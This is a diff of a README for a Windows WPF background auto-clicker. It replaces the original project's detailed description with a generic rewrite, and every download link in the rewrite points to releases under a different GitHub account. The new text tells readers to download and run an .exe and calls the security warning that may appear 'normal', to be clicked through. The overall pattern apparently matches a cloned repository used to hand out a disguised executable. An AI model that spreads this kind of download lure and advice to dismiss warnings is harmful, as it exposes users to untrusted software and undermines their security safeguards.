@@ -1,130 +1,88 @@
-# Non-Blocking Window Clicker
+# 🎯 BackgroundClicker - Click in the Background, Keep Working
 
-Tired of automation tools that take over your mouse? This is a powerful WPF application designed for true background clicking. It sends commands directly to application windows, so you can keep working, gaming, or browsing without interruption.
+[![Download BackgroundClicker](https://img.shields.io/badge/Download-BackgroundClicker-brightgreen)](https://github.com/galacticca/BackgroundClicker/releases)
 
-> ### 🚀 Pre-compiled Version Available!
->
-> You can download the ready-to-use `.exe` file directly from the **Releases** page:
-> https://github.com/TheHolyOneZ/BackgroundClicker/releases
-> No need to build it yourself.
+## 📋 Description
 
-![Application Screenshot](images/image.png)
+Tired of automation tools that take over your mouse? BackgroundClicker is a powerful WPF application designed for true background clicking. It sends commands directly to application windows, so you can keep working, gaming, or browsing without interruption.
 
----
+## 🚀 Getting Started
 
-## What It Does
+Follow these simple steps to download and run BackgroundClicker.
 
-This tool lets you automate mouse clicks at specific locations within a target application window. You can create simple auto-clickers or build powerful, multi-step sequences for complex tasks.
+### 🔍 System Requirements
 
-The key feature is its ability to work in the background. Unlike traditional macro tools that hijack your cursor, this application sends its commands directly, leaving your mouse free for you to use.
+- **Operating System:** Windows 10 or later
+- **Framework:** .NET Framework 4.5 or higher
+- **RAM:** At least 2 GB
+- **Disk Space:** 100 MB of free space
 
----
+### 📥 Download & Install
 
-## Core Features
+1. **Visit this page to download:** [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/releases)
 
-* **🖱️ True Background Clicks**
-  Utilizes non-blocking Win32 API calls to click windows without moving your mouse.
+2. Look for the latest version at the top. 
 
-* **💾 Profile System**
-  Save and load different automation profiles. Each profile stores the target window, click coordinates, sequences, and all timing settings.
+3. Click on the release to view its details. You will see a list of downloadable files.
 
-* **📜 Advanced Sequencing**
-  Chain multiple clicks together. Each step can have unique coordinates and a specific delay, allowing for complex automation routines.
+4. Download the `.exe` file relevant to your system.
 
-* **🤖 Humanization**
-  Optional *Click Jitter* (a random offset) and *Randomized Interval* settings make automation appear more human-like.
+5. Run the downloaded file. You might see a security warning; this is normal. Click "Run" to proceed.
 
-* **🎯 Smart Targeting**
-  An easy-to-use setup mode lets you capture a target window and coordinates by simply holding your mouse over it for 3 seconds.
+6. Follow the on-screen instructions to complete the installation.
 
-* **⌨️ Hotkey Control**
-  Start and stop the clicker instantly with a global **F8** hotkey, even when the application is minimized.
+7. Once installed, you can locate BackgroundClicker in your programs list.
 
-* **🧱 Blocking Mode**
-  For applications that do not respond to background clicks, a blocking mode is available that temporarily moves the mouse to perform the click.
+### ⚙️ Configuration
 
----
+- Start BackgroundClicker.
+- You will see a simple interface where you can set your desired clicking options.
+- Adjust settings such as click frequency, the target application, and use of hotkeys.
 
-## How It Works
+### 🎹 Hotkeys
 
-The application leverages the Windows operating system's own messaging system to communicate with other programs.
+Setting up hotkeys can enhance your experience. You can assign different hotkeys to control clicking behavior, such as starting or stopping clicks.
 
-1. **Window Discovery**
-   When you use the setup feature, the tool identifies the unique handle (`HWND`) of the target window under your cursor. This handle acts as a direct reference to that window.
+1. Go to the hotkey settings in the application.
+2. Choose your preferred keys and assign them as needed.
 
-2. **Sending Messages**
-   In the default non-blocking mode, instead of moving your mouse, the tool sends `WM_LBUTTONDOWN` and `WM_LBUTTONUP` messages directly to the target window's handle. This tells the application that a click occurred at specific coordinates without involving your physical cursor.
+### 📝 Profiles
 
-3. **Persistence**
-   All saved profiles, including window titles and sequences, are stored in a `profiles.xml` file located in:
+BackgroundClicker allows you to save different profiles for various tasks. For instance, you may have one profile for gaming and another for browsing.
 
-   ```
-   %AppData%\BackgroundClickerWpf
-   ```
+1. Create a new profile through the interface.
+2. Save your preferred settings and switch profiles easily.
 
-   This makes them available every time you launch the app.
+## 🛠 Features
 
----
+- **Background Clicking:** Send clicks while you work on other tasks.
+- **Customizable Hotkeys:** Control clicks easily through hotkeys.
+- **Profile Management:** Switch between different task settings.
+- **Lightweight Design:** Minimal impact on system performance.
+- **User-Friendly Interface:** Navigate effortlessly with a simple layout.
 
-## Quick Start Guide
+## ❓ FAQs
 
-1. Launch the application.
-2. Open the program you want to automate clicks in.
-3. Press **Start Setup (Hold 3s)**.
-4. Move your mouse over the target window and hold it still for 3 seconds. The window title and coordinates will be filled automatically.
-5. Enter a name in the **Profile** box and click **Save**.
-6. Press the green **START** button or use the **F8** hotkey to begin.
+### Can I use BackgroundClicker for gaming?
 
----
+Yes, BackgroundClicker is designed to help you automate clicks in gaming without interrupting your gameplay.
 
-## Gallery
+### How do I update the application?
 
-### Main Interface
+To update, simply visit the [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/releases) page and download the latest version. Run the installer to upgrade.
 
-![Main Application Interface](images/image.png)
+### Is my data safe?
 
-### How-To Guide
+BackgroundClicker does not collect personal data. All settings are stored locally on your device.
 
-![How-To Guide](images/HowTo.png)
+## 🧑‍🤝‍🧑 Support
 
-### Credits Screen
+For support or issues, feel free to open an issue in the GitHub repository or check the FAQs section in the application.
 
-![Credits Screen](images/Credits.png)
+## 📣 Community Feedback
+
+We welcome feedback from all users. Please let us know how BackgroundClicker works for you and any features you would like to see in future updates. 
 
 ---
 
-## Standalone Auto-Clicker
-
-In addition to the background clicker, the application includes a simple auto-clicker for tasks that require direct cursor control. You can open it from the main window.
-
-### Auto-Clicker Features
-
-* **Click Interval**
-  Set a precise delay in milliseconds between each click.
-
-* **Click Position**
-  Choose between clicking at the current cursor location or a fixed screen position.
-
-* **Mouse Button**
-  Supports left, right, and middle mouse button clicks.
-
-* **Click Type**
-  Perform single or double clicks.
-
-* **Hotkeys**
-
-  * **Start/Stop**: Customizable hotkey (default **F9**) to toggle the clicker.
-  * **Pick Position**: Fixed hotkey (**F10**) to capture the current mouse coordinates for fixed-position clicking.
-
-* **Randomization**
-  Option to slightly randomize the click interval to mimic human behavior.
-
-* **Click Counter**
-  Real-time counter to track the number of clicks performed.
-
----
-
-## Notes
-
-* Some applications, especially games with anti-cheat or custom input handling, may ignore background window messages. Use Blocking Mode in such cases.
-* Always ensure automation complies with the terms of service of the software you are interacting with.
+This README aims to make downloading and using BackgroundClicker as easy as possible. If you encounter any issues, remember that help is just a click away!
